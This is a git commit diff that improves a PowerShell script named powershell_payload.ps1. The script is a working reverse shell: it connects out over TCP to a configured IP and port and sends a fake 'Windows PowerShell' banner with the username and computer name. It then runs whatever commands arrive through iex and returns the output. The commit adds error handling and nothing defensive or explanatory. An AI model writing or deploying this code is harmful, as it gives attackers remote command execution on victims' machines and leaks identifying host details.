b59f4eebd007342ad071f6f41d909aec2af76f0c
Andrea Fioraldi <andreafioraldi@gmail.com>
2017-08-22 16:40:01 +0200

    improved powershell script

--- powershell_payload.ps1
+++ powershell_payload.ps1
@@ -9,18 +9,30 @@ $client = New-Object System.Net.Sockets.TCPClient($ip_address, $port);
 $stream = $client.GetStream();
 [byte[]] $in_bytes = 0..65535|%{0};
 
-$result  = "PS " + (pwd).Path + "> ";
-$out_bytes = ([text.encoding]::ASCII).GetBytes($result);
-$stream.Write($out_bytes, 0, $out_bytes.Length);
-$stream.Flush()
+$out_bytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+$stream.Write($out_bytes, 0, $out_bytes.Length)
 
-while(($i = $stream.Read($in_bytes, 0, $in_bytes.Length)) -ne 0)
+$out_bytes = ([text.encoding]::ASCII).GetBytes("PS " + (pwd).Path + "> ")
+$stream.Write($out_bytes, 0, $out_bytes.Length)
+
+while (($i = $stream.Read($in_bytes, 0, $in_bytes.Length)) -ne 0)
 {
 	$cmd = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($in_bytes, 0, $i);
-	$result  = (iex $cmd 2>&1 | Out-String ) + "PS " + (pwd).Path + "> ";
-	$out_bytes = ([text.encoding]::ASCII).GetBytes($result);
-	$stream.Write($out_bytes, 0, $out_bytes.Length);
-	$stream.Flush()
+	try
+	{
+		$result = (iex $cmd 2>&1 | Out-String)
+	}
+	catch
+	{
+		Write-Warning "COMMAND ERROR" 
+		Write-Error $_
+	}
+
+	$out_bytes = ([text.encoding]::ASCII).GetBytes($result + ($error[0] | Out-String) + "PS " + (pwd).Path + "> ")
+	$error.clear()
+	
+	$stream.Write($out_bytes, 0, $out_bytes.Length)
+	$stream.Flush()  
 }
 
 $client.Close()
